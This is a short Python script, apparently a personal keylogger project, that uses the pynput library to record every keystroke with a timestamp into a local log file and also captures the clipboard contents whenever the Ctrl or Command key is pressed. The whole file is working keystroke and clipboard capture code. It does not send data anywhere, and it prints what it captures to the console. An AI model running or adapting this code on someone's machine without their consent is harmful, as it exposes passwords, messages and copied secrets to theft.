from pynput.keyboard import Key, Listener
import logging
import os
import pyperclip  # To access clipboard

# Define the directory where the log file will be saved
log_dir = r"/Users/toheed/Projects/keylogger/"
log_file = os.path.join(log_dir, "keyLog.txt")

# Ensure the log directory exists
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

# Configure logging settings
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        # Log the key press
        logging.info(str(key))
        print(key)
        
        # Check for clipboard content when Ctrl+C or Command+C is pressed
        if key == Key.ctrl_l or key == Key.cmd:
            clipboard_content = pyperclip.paste()  # Get the current clipboard content
            logging.info(f'Clipboard copied: {clipboard_content}')
            print(f'Clipboard copied: {clipboard_content}')
    except Exception as e:
        print(f"Error logging key or clipboard: {e}")

# Set up listener to capture keystrokes
with Listener(on_press=on_press) as listener:
    listener.join()
